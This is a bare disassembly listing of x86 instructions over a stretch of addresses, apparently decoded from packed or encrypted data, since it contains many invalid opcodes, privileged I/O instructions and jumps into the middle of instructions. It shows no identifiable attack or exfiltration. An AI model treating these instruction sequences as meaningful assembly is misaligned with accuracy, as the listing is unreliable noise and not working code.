  4179ea:	pop    ds
  4179eb:	add    al,0x88
  4179ed:	loop   0x417a08
  4179ef:	or     WORD PTR [edi-0x50320961],bp
  4179f6:	sub    bh,BYTE PTR [esi+0x6536922c]
  4179fc:	push   0x6
  4179fe:	add    eax,0xddbb6c17
  417a03:	clc    
  417a04:	pop    ss
  417a05:	push   0xabe1852a
  417a0a:	sti    
  417a0b:	repz jns 0x4179e5
  417a0e:	mov    ebx,0xe2e73f5e
  417a14:	sahf   
  417a15:	mov    ah,0xc3
  417a17:	add    al,BYTE PTR [ecx+0x5]
  417a1a:	pop    esp
  417a1b:	pop    ss
  417a1c:	std    
  417a1d:	xlat   BYTE PTR ds:[ebx]
  417a1e:	mov    dh,0x8d
  417a20:	cld    
  417a21:	fidivr WORD PTR [ebx-0x23e78cc6]
  417a27:	(bad)  
  417a28:	cli    
  417a29:	jp     0x417a92
  417a2b:	xor    BYTE PTR [edx+0x3f3057b3],ch
  417a31:	das    
  417a32:	xor    esp,DWORD PTR [ebp+ecx*1-0x13]
  417a36:	push   ds
  417a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a38:	and    esp,DWORD PTR [ebp+0x5a095e82]
  417a3e:	leave  
  417a3f:	(bad)  
  417a40:	sub    ch,BYTE PTR [ecx]
  417a42:	and    al,0x67
  417a44:	scas   al,BYTE PTR es:[edi]
  417a45:	mov    ebp,0x538f282e
  417a4a:	push   edx
  417a4b:	cmp    ecx,DWORD PTR [edx-0x40]
  417a4e:	cdq    
  417a4f:	xor    eax,0xf4fd3057
  417a54:	call   0xb723:0xe1196ee9
  417a5b:	lock add edi,DWORD PTR [eax+0x65b25624]
  417a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a63:	xchg   DWORD PTR [esi],edx
  417a65:	call   0xf38c4f97
  417a6a:	loop   0x4179f4
  417a6c:	dec    edx
  417a6d:	ds xchg esp,eax
  417a6f:	aas    
  417a70:	or     BYTE PTR [edi+0x33ef6dd4],ch
  417a76:	ds call 0xddb63355
  417a7c:	xchg   ebp,eax
  417a7d:	and    DWORD PTR fs:[esi+0x144f5db0],0xffffffb3
  417a85:	inc    ebp
  417a86:	sub    DWORD PTR [esi+edx*2+0xa],esp
  417a8a:	mov    ah,0xee
  417a8c:	push   ebx
  417a8d:	ja     0x417a1d
  417a8f:	js     0x417aea
  417a91:	mov    dh,0x5e
  417a93:	adc    al,0x2c
  417a95:	jbe    0x417a8a
  417a97:	cwde   
  417a98:	adc    BYTE PTR [edx+0x45337815],0x60
  417a9f:	inc    edi
  417aa0:	(bad)  [esi-0x39]
  417aa3:	pusha  
  417aa4:	adc    edx,edi
  417aa6:	fbstp  TBYTE PTR [ecx]
  417aa8:	dec    esi
  417aa9:	dec    esi
  417aaa:	arpl   sp,di
  417aac:	mov    edx,0x37b8f6d9
  417ab1:	scas   al,BYTE PTR es:[edi]
  417ab2:	push   0x8a85d755
  417ab7:	into   
  417ab8:	jge    0x417acf
  417aba:	cmp    bl,BYTE PTR fs:[ecx-0x58]
  417abe:	xchg   ebx,eax
  417abf:	ins    BYTE PTR es:[edi],dx
  417ac0:	ret    
  417ac1:	cld    
  417ac2:	icebp  
  417ac3:	pop    ecx
  417ac4:	jne    0x417a5b
  417ac6:	mul    BYTE PTR [ecx+0x6e11e670]
  417acc:	sahf   
  417acd:	sub    DWORD PTR [edi-0x740d8567],edx
  417ad3:	test   al,0xfd
  417ad5:	cmp    al,0xbf
  417ad7:	popa   
  417ad8:	enter  0xc716,0x7f
  417adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417add:	xor    bh,dh
  417adf:	xor    dh,cl
  417ae1:	jo     0x417a9a
  417ae3:	jp     0x417ab1
  417ae5:	scas   al,BYTE PTR es:[edi]
  417ae6:	imul   DWORD PTR [ebp-0x4c]
  417ae9:	lea    eax,[ebx+0x6c]
  417aec:	sbb    esp,edx
  417aee:	mov    edx,0xb141a109
  417af3:	or     bl,BYTE PTR [edx]
  417af5:	outs   dx,DWORD PTR ds:[esi]
  417af6:	jb     0x417af7
  417af8:	fsub   DWORD PTR [ebx+0x31c8b51d]
  417afe:	jnp    0x417b31
  417b00:	iret   
  417b01:	jle    0x417a94
  417b03:	test   BYTE PTR [ecx-0x79],dl
  417b06:	arpl   WORD PTR [ebp+0x0],dx
  417b09:	push   edi
  417b0a:	repz (bad) 
  417b0c:	aam    0xab
  417b0e:	(bad)  [edi+0x2603a537]
  417b14:	fcomp  st(1)
  417b16:	mov    eax,0x3ab552f1
  417b1b:	dec    ebx
  417b1c:	add    dl,BYTE PTR fs:[ecx+0x7a806646]
  417b23:	mov    dl,0x63
  417b25:	test   al,cl
  417b27:	mov    bh,0x22
  417b29:	pop    ebp
  417b2a:	cmp    ah,BYTE PTR [eax]
  417b2c:	aad    0xb
  417b2e:	(bad)  
  417b2f:	jo     0x417b67
  417b31:	nop
  417b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b33:	(bad)  
  417b34:	fld    QWORD PTR [eax]
  417b36:	xor    ecx,DWORD PTR [edx-0x62ad2c16]
  417b3c:	push   edx
  417b3d:	mov    ah,0x71
  417b3f:	popf   
  417b40:	gs add eax,0xe2406fd5
  417b46:	cli    
  417b47:	mov    ebp,DWORD PTR [edi]
  417b49:	and    eax,0x9e44e567
  417b4e:	push   ebp
  417b4f:	jns    0x417b0d
  417b51:	faddp  st(4),st
  417b53:	push   esp
  417b54:	jne    0x417b03
  417b56:	icebp  
  417b57:	or     edx,ecx
  417b59:	dec    edx
  417b5a:	add    BYTE PTR [bp+0x5228],bl
  417b5f:	jmp    0x417af0
  417b61:	std    
  417b62:	shl    al,1
  417b64:	into   
  417b65:	fnstcw WORD PTR [ebp-0x62]
  417b68:	adc    eax,0x60d18f5f
  417b6d:	mov    dh,0x80
  417b6f:	daa    
  417b70:	loopne 0x417afe
  417b72:	bound  ecx,QWORD PTR [edi]
  417b74:	loopne 0x417b9e
  417b76:	aas    
  417b77:	int3   
  417b78:	lds    ecx,FWORD PTR [edx]
  417b7a:	out    0x3f,al
  417b7c:	les    eax,FWORD PTR [esi+0x6f41abb7]
  417b82:	mov    esp,0x4c95a2cd
  417b87:	inc    ecx
  417b88:	and    BYTE PTR [edi-0x4e],bh
  417b8b:	mov    edi,0x8f1623d0
  417b90:	fwait
  417b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b92:	jg     0x417b38
  417b94:	das    
  417b95:	scas   al,BYTE PTR es:[edi]
  417b96:	inc    esp
  417b97:	loopne 0x417b63
  417b99:	popa   
  417b9a:	mov    BYTE PTR [edi],dl
  417b9c:	inc    sp
  417b9e:	mov    cl,0x40
  417ba0:	das    
  417ba1:	adc    DWORD PTR [esp+esi*4+0x2f41f1f5],esi
  417ba8:	lds    ebx,FWORD PTR [ecx+eax*2]
  417bab:	push   ebp
  417bac:	outs   dx,BYTE PTR ds:[esi]
  417bad:	xor    bl,dl
  417baf:	inc    ebx
  417bb0:	cmp    eax,0x614add9
  417bb5:	mov    ebx,0xcfdad00e
  417bba:	sahf   
  417bbb:	fs in  al,dx
  417bbd:	dec    ebp
  417bbe:	inc    ecx
  417bbf:	outs   dx,DWORD PTR ds:[esi]
  417bc0:	cs es pop ss
  417bc3:	adc    bl,BYTE PTR [edx-0x38]
  417bc6:	mov    ebp,0x1cc1098d
  417bcb:	shr    BYTE PTR [esi-0x7a],0x52
  417bcf:	leave  
  417bd0:	jecxz  0x417c01
  417bd2:	sbb    eax,0xd1181ba9
  417bd7:	ret    0xa9ed
  417bda:	lds    eax,FWORD PTR [edx-0x17]
  417bdd:	cdq    
  417bde:	or     eax,0x63e03e2b
  417be3:	pop    edi
  417be4:	ds fwait
  417be6:	jo     0x417bd6
  417be8:	inc    esi
  417be9:	(bad)  
  417bea:	cvtdq2ps xmm7,XMMWORD PTR [edi+edx*4]
  417bee:	loope  0x417c07
  417bf0:	mov    ebp,0x3a431e5e
  417bf5:	and    BYTE PTR [esi],cl
  417bf7:	enter  0x269f,0x9f
  417bfb:	int    0xfb
  417bfd:	pop    ebp
  417bfe:	sub    BYTE PTR [ecx-0x23b8bec0],dh
  417c04:	push   ebp
  417c05:	sbb    DWORD PTR es:[edi+0x4b18bb1c],eax
  417c0c:	cld    
  417c0d:	lea    ebp,[edx+esi*4-0x41]
  417c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c12:	pop    ecx
  417c13:	pop    ds
  417c14:	daa    
  417c15:	shl    ebp,cl
  417c17:	ret    0x675c
  417c1a:	mov    WORD PTR [esi],fs
  417c1c:	lea    esp,[ecx]
  417c1e:	inc    ebp
  417c1f:	mov    ebp,0x26f0d03a
  417c24:	sbb    al,dh
  417c26:	addr16 and dh,dl
  417c29:	ins    DWORD PTR es:[edi],dx
  417c2a:	inc    edx
  417c2b:	or     eax,0x5ef2e33d
  417c30:	push   0x71853604
  417c35:	inc    ecx
  417c36:	out    0xa3,eax
  417c38:	jnp    0x417c4e
  417c3a:	pusha  
  417c3b:	xor    BYTE PTR [esi-0x12c9b2b5],dl
  417c41:	mov    dl,0x7f
  417c43:	xor    BYTE PTR [esi],dh
  417c45:	xchg   BYTE PTR [ebx],bh
  417c47:	fst    QWORD PTR [ebx-0x22]
  417c4a:	je     0x417c1c
  417c4c:	and    DWORD PTR [edi],edx
  417c4e:	mov    al,ds:0xc391326d
  417c53:	loop   0x417cd1
  417c55:	sbb    DWORD PTR [ebp+eiz*1-0x4c679c09],esi
  417c5c:	(bad)  
  417c5d:	or     eax,0xdc21cd0a
  417c62:	pop    esp
  417c63:	(bad)
  417c66:	in     eax,0xbf
  417c68:	xor    al,0xb9
  417c6a:	jae    0x417c0c
  417c6c:	jne    0x417c47
  417c6e:	ins    DWORD PTR es:[edi],dx
  417c6f:	mov    ecx,DWORD PTR [eax-0x45]
  417c72:	jns    0x417c57
  417c74:	sbb    al,0x81
  417c76:	outs   dx,DWORD PTR ds:[esi]
  417c77:	(bad)  
  417c79:	mov    bh,0xbf
  417c7b:	stos   BYTE PTR es:[edi],al
  417c7c:	repnz pop ebx
  417c7e:	mov    esp,0x7ddea6ce
  417c83:	sbb    dh,BYTE PTR [eax-0x33]
  417c86:	or     al,bl
  417c88:	fdivr  DWORD PTR [esi-0x43806f91]
  417c8e:	xchg   esp,eax
  417c8f:	pop    edi
  417c90:	ins    DWORD PTR es:[edi],dx
  417c91:	mov    esi,0xb6066c00
  417c96:	call   0x86dad5f
  417c9b:	cmp    BYTE PTR [edx+edi*2],0xba
  417c9f:	xor    ch,BYTE PTR [eax]
  417ca1:	fninit 
  417ca3:	pop    ebp
  417ca4:	lds    edi,FWORD PTR [ebp-0x19]
  417ca7:	or     ch,BYTE PTR [eax+0x35d1d536]
  417cad:	push   cs
  417cae:	call   0x377e6005
  417cb3:	lea    esi,[ecx]
  417cb5:	inc    edi
  417cb6:	push   ss
  417cb7:	cmc    
  417cb8:	push   ebx
  417cb9:	xchg   edx,eax
  417cba:	inc    edx
  417cbb:	sbb    dh,bh
  417cbd:	int3   
  417cbe:	mov    ebx,0xcd5886c
  417cc3:	scas   eax,DWORD PTR es:[edi]
  417cc4:	gs clc 
  417cc6:	push   edx
  417cc7:	cdq    
  417cc8:	push   esi
  417cc9:	push   cs
  417cca:	dec    edi
  417ccb:	mov    ch,0x15
  417ccd:	out    0x6b,al
  417ccf:	and    eax,0xcfa94883
  417cd4:	sbb    cl,ah
  417cd6:	sbb    dh,BYTE PTR [eax]
  417cd8:	push   ecx
  417cd9:	pop    ebx
  417cda:	jl     0x417c7a
  417cdc:	lahf   
  417cdd:	loop   0x417cd0
  417cdf:	xchg   ecx,eax
  417ce0:	push   ecx
  417ce1:	daa    
  417ce2:	fsub   DWORD PTR ds:0x8c537c00
  417ce8:	pmulhuw mm5,mm3
  417ceb:	inc    DWORD PTR [eax]
  417ced:	cmp    al,0x7e
  417cef:	inc    ebx
  417cf0:	mov    eax,0x984f6cd9
  417cf5:	cdq    
  417cf6:	inc    edx
  417cf7:	and    BYTE PTR [edi],bh
  417cf9:	cmp    al,0x59
  417cfb:	inc    ecx
  417cfc:	scas   eax,DWORD PTR es:[edi]
  417cfd:	neg    BYTE PTR [eax]
  417cff:	xchg   ecx,eax
  417d00:	ins    BYTE PTR es:[edi],dx
  417d01:	jecxz  0x417ccd
  417d03:	inc    edx
  417d04:	fmul   st,st(1)
  417d06:	dec    edx
  417d07:	arpl   WORD PTR [eax-0x533dab6d],sp
  417d0d:	fucomi st,st(2)
  417d0f:	addr16 in al,dx
  417d11:	test   esi,0x8560705
  417d17:	inc    esi
  417d18:	xchg   edx,eax
  417d19:	inc    ebp
  417d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d1b:	mov    esp,0xb497efac
  417d20:	xchg   ebx,eax
  417d21:	or     cl,BYTE PTR [edi+0x7ded4442]
  417d27:	mov    ds:0x146e9d48,al
  417d2c:	je     0x417cc7
  417d2e:	jmp    0x2580b536
  417d33:	xchg   ecx,eax
  417d34:	xor    al,0x81
  417d36:	cli    
  417d37:	inc    esi
  417d38:	xor    eax,0x39cbdb5a
  417d3d:	add    edx,ebx
  417d3f:	imul   ebx,ebx,0xc0eec82a
  417d45:	aas    
  417d46:	fimul  WORD PTR [ecx]
  417d48:	mov    ds:0xee9755e9,eax
  417d4d:	add    dl,BYTE PTR ds:0xbcf2497c
  417d53:	and    BYTE PTR ds:[esi+ecx*8+0x52],bl
  417d58:	jge    0x417d63
  417d5a:	xchg   ecx,eax
  417d5b:	and    eax,0xa5b9fc93
  417d60:	xchg   esi,eax
  417d61:	mov    cl,0xf8
  417d63:	aaa    
  417d64:	mov    edi,0x711f0960
  417d69:	xchg   ebx,eax
  417d6a:	xor    eax,0x1f2916d3
  417d6f:	or     BYTE PTR [ebx],bh
  417d71:	ss pushf 
  417d73:	jle    0x417dec
  417d75:	fldenv [ecx+0x1d]
  417d78:	jp     0x417d8a
  417d7a:	adc    al,0x29
  417d7c:	iret   
  417d7d:	test   DWORD PTR [ebx+0x7a],ebx
  417d80:	jge    0x417d1a
  417d82:	inc    ecx
  417d83:	mov    bh,0x57
  417d85:	push   esp
  417d86:	mov    al,ds:0xa1a2b788
  417d8b:	inc    ebx
  417d8c:	mov    BYTE PTR [esi],dh
  417d8e:	jle    0x417ddf
  417d90:	mov    ah,0x12
  417d92:	cmp    DWORD PTR [eax],edx
  417d94:	pusha  
  417d95:	test   al,0xa5
  417d97:	mov    ah,BYTE PTR [esi-0x727dcf23]
  417d9d:	push   ds
  417d9e:	adc    ch,bl
  417da0:	bound  ebp,QWORD PTR [ecx-0x49768ac1]
  417da6:	pop    es
  417da7:	add    eax,0xcbdbaeff
  417dac:	sbb    al,0xf7
  417dae:	jo     0x417dd8
  417db0:	cmp    DWORD PTR [ecx+ebp*4-0x562fe7f0],esi
  417db7:	pop    esp
  417db8:	(bad)  
  417dba:	adc    al,0xe
  417dbc:	and    BYTE PTR [eax],bh
  417dbe:	cdq    
  417dbf:	jp     0x417df1
  417dc1:	lds    ecx,FWORD PTR [ecx+0x4]
  417dc4:	adc    eax,DWORD PTR [edx+0x26]
  417dc7:	lods   eax,DWORD PTR ds:[esi]
  417dc8:	inc    ecx
  417dc9:	sbb    ecx,ebp
  417dcb:	mov    ah,0xb2
  417dcd:	mov    dl,0x2a
  417dcf:	ins    DWORD PTR es:[edi],dx
  417dd0:	xchg   esp,eax
  417dd1:	mov    edx,0xc4721272
  417dd6:	icebp  
  417dd7:	fimul  DWORD PTR [esi]
  417dd9:	test   bh,al
  417ddb:	popa   
  417ddc:	fild   DWORD PTR [esi]
  417dde:	lock mov dl,0x44
  417de1:	or     BYTE PTR [ebp-0x1f],dl
  417de4:	mov    edx,0xe44b82d8
  417de9:	outs   dx,DWORD PTR ds:[esi]
  417dea:	dec    eax
  417deb:	out    dx,eax
  417dec:	test   BYTE PTR [ecx-0x2129c692],dl
  417df2:	or     eax,0x4836ed55
  417df7:	cwde   
  417df8:	and    eax,0x496808ff
  417dfd:	(bad)
  417e00:	jno    0x417de0
  417e02:	push   ebx
  417e03:	pop    eax
  417e04:	jmp    0x417e2a
  417e06:	jne    0x417e2f
  417e08:	repz mov ebp,0x32cc9efd
  417e0e:	sub    al,0x8c
  417e10:	ja     0x417dce
  417e12:	mov    edi,0xb92eeebc
  417e17:	and    BYTE PTR [esi+eiz*4-0x63],ah
  417e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1c:	cdq    
  417e1d:	mov    esi,0xd6891d38
  417e22:	push   ecx
  417e23:	stc    
  417e24:	add    eax,DWORD PTR [esi]
  417e26:	repnz push edx
  417e28:	je     0x417dca
  417e2a:	dec    esi
  417e2b:	(bad)  
  417e2c:	sub    al,0xa4
  417e2e:	lods   eax,DWORD PTR ds:[esi]
  417e2f:	push   esp
  417e30:	mov    ebp,0x863b14b8
  417e35:	mov    esi,0xca49a823
  417e3a:	das    
  417e3b:	cmc    
  417e3c:	imul   edi,DWORD PTR [ecx+0x71],0x11
  417e40:	ret    0x2a28
  417e43:	push   ss
  417e44:	retf   
  417e45:	cwde   
  417e46:	ror    ecx,cl
  417e48:	inc    ecx
  417e49:	or     DWORD PTR [ecx-0x4eff595d],ebp
  417e4f:	enter  0xdb2f,0x9c
  417e53:	inc    edi
  417e54:	lods   al,BYTE PTR ds:[esi]
  417e55:	push   0xffffffd2
  417e57:	and    bh,ch
  417e59:	ja     0x417e52
  417e5b:	cmc    
  417e5c:	dec    eax
  417e5d:	sub    DWORD PTR [edx],eax
  417e5f:	add    ecx,esi
  417e61:	xchg   ecx,eax
  417e62:	aad    0x48
  417e64:	pushf  
  417e65:	and    DWORD PTR [esi+ecx*8-0x3718387c],ecx
  417e6c:	ffree  st(4)
  417e6e:	and    al,0xb6
  417e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e71:	mov    esi,0xbfd03b82
  417e76:	loop   0x417ee9
  417e78:	outs   dx,BYTE PTR ds:[esi]
  417e79:	inc    esp
  417e7a:	(bad)  
  417e7b:	(bad)  
  417e7c:	in     eax,dx
  417e7d:	jp     0x417e98
  417e7f:	sub    BYTE PTR [edi+0x7d],al
  417e82:	add    DWORD PTR [ecx+0x64550a7b],ebx
  417e88:	movlps xmm0,QWORD PTR [edx]
  417e8b:	aam    0xae
  417e8d:	pop    esp
  417e8e:	fimul  DWORD PTR [ecx+0x2d]
  417e91:	clc    
  417e92:	cli    
  417e93:	and    edx,ebp
  417e95:	arpl   WORD PTR [ecx-0xa],cx
  417e98:	lods   al,BYTE PTR ds:[esi]
  417e99:	jne    0x417e1d
  417e9b:	test   BYTE PTR ds:0xd751b169,al
  417ea1:	int    0xe
  417ea3:	add    DWORD PTR [ebx+0x20],0xa023bb83
  417eaa:	jbe    0x417f14
  417eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ead:	and    bl,dl
  417eaf:	jbe    0x417f2e
  417eb1:	cli    
  417eb2:	mov    eax,ds:0x19d33a38
  417eb7:	mov    esi,DWORD PTR [ecx-0x8b170bb]
  417ebd:	cmp    DWORD PTR [ecx-0x3b855a3c],esp
  417ec3:	(bad)  
  417ec4:	std    
  417ec5:	dec    edx
  417ec6:	xchg   ebp,eax
  417ec7:	imul   ebx,DWORD PTR [eax],0x9543f141
  417ecd:	push   ebp
  417ece:	in     eax,0x93
  417ed0:	push   edx
  417ed1:	ret    0x4491
  417ed4:	pop    ss
  417ed5:	cmp    al,0x28
  417ed7:	mov    al,ds:0xfb220501
  417edc:	cs sub eax,0xfec4397d
  417ee2:	cmp    ebx,DWORD PTR [ebp+0x9]
  417ee5:	adc    eax,0x6f1822d4
  417eea:	cmc    
  417eeb:	mov    ds:0x592c82fe,eax
  417ef0:	dec    ecx
  417ef1:	push   edi
  417ef2:	inc    ebp
  417ef3:	(bad)  
  417ef5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417ef7:	inc    ebx
  417ef8:	and    edx,DWORD PTR ds:0x64ba7ed2
  417efe:	cli    
  417eff:	shl    esp,cl
  417f01:	fadd   QWORD PTR [edi-0x1a]
  417f04:	xchg   ebp,eax
  417f05:	jbe    0x417f31
  417f07:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  417f09:	push   esi
  417f0a:	mov    dl,bl
  417f0c:	and    eax,0xec8275f8
  417f11:	xchg   esp,eax
  417f12:	ins    BYTE PTR es:[edi],dx
  417f13:	call   0x4ec6b905
  417f18:	sbb    esi,DWORD PTR ds:0x31f8b227
  417f1e:	xchg   ebx,eax
  417f1f:	jecxz  0x417f3a
  417f21:	(bad)  
  417f22:	pop    eax
  417f23:	push   0xfddacce6
  417f28:	gs addr16 hlt 
  417f2b:	mov    ecx,esi
  417f2d:	cmp    DWORD PTR [ebx+0x22],ebp
  417f30:	cmp    BYTE PTR [eax+0x5c],0xd4
  417f34:	fs popf 
  417f36:	rol    BYTE PTR [esi],cl
  417f38:	mov    ah,0xed
  417f3a:	stos   BYTE PTR es:[edi],al
  417f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f3c:	xchg   ebp,eax
  417f3d:	push   0x37205eae
  417f42:	or     eax,0x77b3e9ff
  417f47:	xchg   BYTE PTR [ebx-0x6],cl
  417f4a:	add    BYTE PTR [ecx-0x6d],dl
  417f4d:	daa    
  417f4e:	xchg   edx,eax
  417f4f:	sub    al,BYTE PTR [eax]
  417f51:	push   cs
  417f52:	lds    ecx,FWORD PTR [ebx+0x4b5e2cd3]
  417f58:	(bad)  
  417f59:	imul   ebp,DWORD PTR [eax-0x1f],0xbdcf0786
  417f60:	ret    
  417f61:	push   ebp
  417f62:	loopne 0x417fce
  417f64:	iret   
  417f65:	sar    BYTE PTR [edx+0x51b5612],cl
  417f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f6c:	enter  0x316d,0x16
  417f70:	sub    eax,0x523a9937
  417f75:	sub    al,0x40
  417f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f78:	mov    edx,0x3de6b6f1
  417f7d:	lahf   
  417f7e:	mov    edx,0x321973bd
  417f83:	add    BYTE PTR [eax],ch
  417f85:	cdq    
  417f86:	inc    ecx
  417f87:	int3   
  417f88:	jno    0x417fb9
  417f8a:	mov    esi,0xb5d241a7
  417f8f:	(bad)  
  417f90:	fucomp st(2)
  417f92:	(bad)  
  417f93:	repz dec edx
  417f95:	icebp  
  417f96:	jmp    0x417fb6
  417f98:	mov    eax,0x76efd2b0
  417f9d:	out    0xad,al
  417f9f:	inc    esi
  417fa0:	adc    eax,0x25e31479
  417fa5:	mov    ecx,0xdc9ebd90
  417faa:	xchg   esi,eax
  417fab:	push   esi
  417fac:	aad    0xd8
  417fae:	adc    al,0x14
  417fb0:	das    
  417fb1:	xlat   BYTE PTR ds:[ebx]
  417fb2:	ror    BYTE PTR ds:0xd1233ee6,cl
  417fb8:	or     esi,0x83db0c06
  417fbe:	or     edx,DWORD PTR [ecx+0x5f]
  417fc1:	mov    bl,ch
  417fc3:	cmp    BYTE PTR [ebp-0x7cda0203],0xf5
  417fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fcb:	jg     0x417f71
  417fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fce:	pop    ds
  417fcf:	bound  ebx,QWORD PTR [edi]
  417fd1:	or     ecx,DWORD PTR [esi-0x7b]
  417fd4:	add    bl,0xbe
  417fd7:	les    ecx,FWORD PTR [esp-0x243a19c9]
  417fde:	mov    ds:0xb4f72166,al
  417fe3:	dec    esp
  417fe4:	cmp    DWORD PTR [edx],0x8979cc8f
  417fea:	adc    esp,DWORD PTR [esi+0xb]
  417fed:	mov    edi,0x5eab2344
  417ff2:	mov    ch,0x18
  417ff4:	pop    esi
  417ff5:	or     dl,BYTE PTR [esi+edi*8]
  417ff8:	jns    0x417fca
  417ffa:	fst    QWORD PTR [ecx-0x6a4ac5b3]
  418000:	pop    eax
  418001:	xchg   BYTE PTR [ebp-0x626ecd2],ah
  418007:	mov    ebp,0xb8656148
  41800c:	inc    edx
  41800d:	fdiv   DWORD PTR [eax]
  41800f:	sbb    BYTE PTR ds:0x71d2cdcf,0x1d
  418016:	dec    ebp
  418017:	pop    esi
  418018:	mov    edi,0x167da6ca
  41801d:	stos   BYTE PTR es:[edi],al
  41801e:	call   0x43c7:0x494646e2
  418025:	jb     0x417fce
  418027:	scas   eax,DWORD PTR es:[edi]
  418028:	push   eax
  418029:	mov    ss,WORD PTR [eax+0x28a74f3a]
  41802f:	jle    0x418093
  418031:	or     eax,0xd30bf89c
  418036:	nop
  418037:	leave  
  418038:	pusha  
  418039:	adc    esi,ecx
  41803b:	int    0xe7
  41803d:	fadd   st(3),st
  41803f:	inc    ecx
  418040:	adc    cl,BYTE PTR [ecx-0x4f]
  418043:	jae    0x417fc6
  418045:	daa    
  418046:	fs sub al,0xff
  418049:	pop    ss
  41804a:	jnp    0x418056
  41804c:	xchg   DWORD PTR [edi+0x98aa5de],esi
  418052:	js     0x418086
  418054:	pop    esi
  418055:	push   ss
  418056:	xchg   edi,eax
  418057:	ins    BYTE PTR es:[edi],dx
  418058:	mov    ebp,0x84138adc
  41805d:	stos   DWORD PTR es:[edi],eax
  41805e:	lods   eax,DWORD PTR ds:[esi]
  41805f:	fmul   st(4),st
  418061:	cmp    ecx,0x79
  418064:	xchg   edi,eax
  418065:	and    ah,0x5e
  418068:	fs push eax
  41806a:	mov    eax,ds:0x332b2f57
  41806f:	lahf   
  418070:	xor    al,0xc8
  418072:	jmp    0x418068
  418074:	imul   esp,DWORD PTR [ecx+0x4917a1a4],0x9cb1e6c0
  41807e:	dec    ebx
  41807f:	dec    ebx
  418080:	push   edi
  418081:	gs nop
  418083:	mov    esi,DWORD PTR [esi+0x2]
  418086:	push   ebp
  418087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418088:	jb     0x41803f
  41808a:	mov    DWORD PTR [ebx-0x13ad0948],edi
  418090:	lods   al,BYTE PTR ds:[esi]
  418091:	in     al,dx
  418092:	lahf   
  418093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418094:	pusha  
  418095:	mov    WORD PTR [edx],gs
  418097:	mov    ecx,0x82f3101f
  41809c:	retf   0xdd7e
  41809f:	sbb    eax,0xa177d962
  4180a4:	cmp    edx,DWORD PTR [edi]
  4180a6:	lea    ecx,[esi-0x34]
  4180a9:	aaa    
  4180aa:	xlat   BYTE PTR ds:[ebx]
  4180ab:	int    0xcb
  4180ad:	shr    al,1
  4180af:	xor    BYTE PTR [edx+0x2beeb8b9],al
  4180b5:	pop    ebp
  4180b6:	out    0xd5,al
  4180b8:	push   ebx
  4180b9:	lods   al,BYTE PTR ds:[esi]
  4180ba:	test   eax,0xa515257e
  4180bf:	mov    bl,0xac
  4180c1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180c3:	ins    BYTE PTR es:[edi],dx
  4180c4:	adc    ebp,edi
  4180c6:	and    al,bh
  4180c8:	cmp    eax,DWORD PTR [ebx+ecx*1+0x738a48ec]
  4180cf:	push   ecx
  4180d0:	inc    ebx
  4180d1:	push   0x29
  4180d3:	outs   dx,BYTE PTR ds:[esi]
  4180d4:	inc    eax
  4180d5:	dec    ecx
  4180d6:	scas   al,BYTE PTR es:[edi]
  4180d7:	pop    esi
  4180d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180d9:	(bad)  
  4180da:	cvtpi2ps xmm1,QWORD PTR [ebx]
  4180dd:	sub    DWORD PTR [eax],esi
  4180df:	cvtps2pi mm4,QWORD PTR [ecx+0x4d]
  4180e3:	out    0xb7,eax
  4180e5:	aam    0xd6
  4180e7:	lock jns 0x418138
  4180ea:	jmp    0x41816a
  4180ec:	aaa    
  4180ed:	mul    DWORD PTR ss:[edi+edi*4+0x11]
  4180f2:	mov    eax,0xc5803a11
  4180f7:	mov    BYTE PTR [edx-0x22],cl
  4180fa:	and    DWORD PTR ds:[edx+edx*2-0x62],edx
  4180ff:	sub    DWORD PTR ds:0xd81c14e8,0xffffffab
  418106:	lea    eax,[eax]
  418108:	and    BYTE PTR [edx],0xfe
  41810b:	dec    esp
  41810c:	or     ch,bl
  41810e:	push   esp
  41810f:	and    BYTE PTR [ecx+0x53fbab01],ah
  418115:	test   BYTE PTR [eax],al
  418117:	jo     0x418102
  418119:	add    bh,cl
  41811b:	inc    ebp
  41811c:	pop    eax
  41811d:	inc    ebx
  41811e:	inc    esi
  41811f:	xchg   esp,eax
  418120:	sbb    eax,0x95b9a424
  418125:	sub    al,0x72
  418127:	ds jns 0x4180cd
  41812a:	xlat   BYTE PTR ds:[ebx]
  41812b:	jbe    0x4180c8
  41812d:	sub    DWORD PTR [edi],ecx
  41812f:	mov    eax,ds:0x55f37cd2
  418134:	cmp    eax,0x2e84d365
  418139:	add    cl,BYTE PTR [ebx]
  41813b:	jge    0x418163
  41813d:	xchg   edi,eax
  41813e:	cmp    edi,DWORD PTR [edi]
  418140:	xchg   ecx,eax
  418141:	lods   eax,DWORD PTR ds:[esi]
  418142:	mov    eax,0x87ae3ca2
  418147:	out    dx,eax
  418148:	xor    DWORD PTR [edx-0x5f],esp
  41814b:	les    esi,FWORD PTR [esp+ebx*1+0x79084d57]
  418152:	aam    0x8b
  418154:	add    eax,0xeb8352e5
  418159:	jl     0x418187
  41815b:	call   0x9fa0704c
  418160:	dec    edx
  418161:	mov    edi,0xe23c46b2
  418166:	push   ecx
  418167:	cmp    edx,DWORD PTR [eax]
  418169:	mov    al,ds:0x64d5a136
  41816e:	pop    es
  41816f:	pop    ecx
  418170:	inc    edx
